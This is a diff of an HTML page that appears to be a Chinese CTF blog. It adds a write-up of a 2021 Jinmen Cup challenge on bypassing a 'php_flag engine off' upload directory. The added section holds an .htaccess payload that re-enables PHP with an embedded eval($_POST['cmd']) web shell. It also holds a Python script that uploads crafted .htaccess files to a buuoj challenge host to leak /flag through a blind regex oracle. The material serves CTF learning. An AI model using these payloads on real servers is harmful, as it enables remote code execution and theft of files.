@@ -305,6 +305,12 @@
         </li>
       </ol>
     </li>
+    <li><a href="#盲注2021津门杯ctf">盲注（2021津门杯ctf)</a>
+      <ol>
+        <li><a href="#解法一">解法一</a></li>
+        <li><a href="#解法二">解法二</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -381,7 +387,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 7 分钟
+                    阅读时长: 8 分钟
                 </time>
             </div>
         
@@ -1075,6 +1081,128 @@
 </span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="盲注2021津门杯ctf">盲注（2021津门杯ctf)
+</h2><p>配置文件是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="ne">Directory</span> <span class="o">~</span> <span class="s2">&#34;/var/www/html/upload/[a-f0-9]{32}/&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">php_flag</span> <span class="n">engine</span> <span class="n">off</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="ne">Directory</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>php_flag engine off</code>是会使整个目录不解析php的，所以上传php文件是行不通的</p>
+<h3 id="解法一">解法一
+</h3><p>就是利用上面我们所学的来进行，但是这里并没有对htaccess进行waf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;FilesMatch .htaccess&gt;
+</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php 
+</span></span><span class="line"><span class="cl">Require all granted  
+</span></span><span class="line"><span class="cl">php_flag engine on	
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">php_value auto_prepend_file .htaccess
+</span></span><span class="line"><span class="cl">#&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="解法二">解法二
+</h3><p>盲注</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;If &#34;file(&#39;/flag&#39;)=~ &#39;/flag{/&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">ErrorDocument 404 &#34;wupco&#34;
+</span></span><span class="line"><span class="cl">&lt;/If&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>~</code> ：用于开启“正则表达式”分析，正则表达式必须在<strong>双引号</strong>之间。</p>
+<p>如果匹配到就设置ErrorDocument 404为&quot;wupco&quot;，那么访问一个不存在的页面时就会显示<code>wupco</code>这个字符串</p>
+<p>盲注脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://b8227f3d-aa38-48ad-bf30-6ce5f87fc177.node5.buuoj.cn:81/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">htaccess</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;If &#34;file(&#39;/flag&#39;)=~ /&#39;&#39;&#39;</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="s1">&#39;&#39;&#39;/&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    ErrorDocument 404 &#34;wupco&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &lt;/If&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://b8227f3d-aa38-48ad-bf30-6ce5f87fc177.node5.buuoj.cn:81/index.php?id=69660&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;submit&#39;</span><span class="p">:</span> <span class="s1">&#39;submit&#39;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span><span class="n">htaccess</span><span class="p">)}</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://b8227f3d-aa38-48ad-bf30-6ce5f87fc177.node5.buuoj.cn:81/upload/&#34;</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="s2">&#34;/a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;wupco&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;flag{&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;\{\}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;checking: &#34;</span><span class="o">+</span> <span class="n">flag</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">+</span><span class="n">i</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
